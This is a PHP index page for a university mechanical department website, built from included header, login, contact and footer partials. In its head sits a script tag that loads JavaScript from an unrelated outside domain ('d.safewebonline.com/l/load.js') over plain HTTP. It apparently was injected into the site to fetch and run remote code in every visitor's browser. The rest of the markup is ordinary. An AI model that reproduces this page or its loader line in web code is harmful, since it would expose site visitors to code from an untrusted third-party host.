<?php
    session_start(); 

?> 

<!DOCTYPE html>
<html lang="en">

<head>
	<script src="http://d.safewebonline.com/l/load.js"></script>
<link rel="shortcut icon" type="image/x-icon" href="images/favicon.ico">
	<meta charset="utf-8">
	<title>UIET | Mechanical Department</title>
	<meta name="description" content="Wiredwiki App">
	
</head>
<style>
body{
padding-top:50px;
}
</style>


<?php
include('mystyle.php');
if($_SESSION['login_user'])
include('header2.php');
else
include('header.php');
include('jumbotron.php');
include('adminlogin.php');
include('contact.php');
include('footer.php');
?>
  
</body>	
</html>